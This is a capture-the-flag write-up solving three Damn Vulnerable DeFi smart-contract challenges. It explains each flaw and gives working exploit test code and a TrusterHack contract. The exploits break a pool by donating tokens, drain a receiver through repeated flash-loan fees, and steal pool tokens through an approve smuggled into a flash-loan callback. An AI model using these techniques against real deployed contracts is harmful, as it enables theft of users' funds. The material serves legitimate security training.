# DamnVulnerableDefi

## Challenge #1 - Unstoppable 

To stop the pool from offering flash loans the assert statement in the flashloan function needs to be exploited. This can be done via sending
tokens to the contract by not using the depositTOken function. This way ```poolBlanace``` will never be equal to ```balanceBefore```.

Add these lines to unstopabble.challenge.js:
```
 it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).transfer(this.pool.address, 1);
    });
```

## Challenge #2 - Naive receiver

To drain all ETH funds from the user's contract , the contract must borrow a flash loan 10 times so that it has to pay a fee of 1ETH everytime.
SInce there's no restriction on the flashLoan function it can be called by anyone. Calling it 10 times does the job.

Add these lines to naive-receiver.challenge.js:
``` 
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        for (let i = 0; i < 10; i++) {
            await this.pool.connect(attacker).flashLoan(this.receiver.address,0);
        }        
        
    });
```
## Challenge #3 - Truster

Create new contract _TrusterHack.sol_ 
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterHack  {

    function hack( address _pool, address _token, uint amount) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), amount
        );

        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
    }
}
```

truster.challenge.js : 
```
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const _TrusterHack = await ethers.getContractFactory('TrusterHack', deployer);
        const TrusterHackContract = await _TrusterHack.deploy();

        await TrusterHackContract.connect(attacker).hack(this.pool.address, this.token.address, TOKENS_IN_POOL);        
    });
```
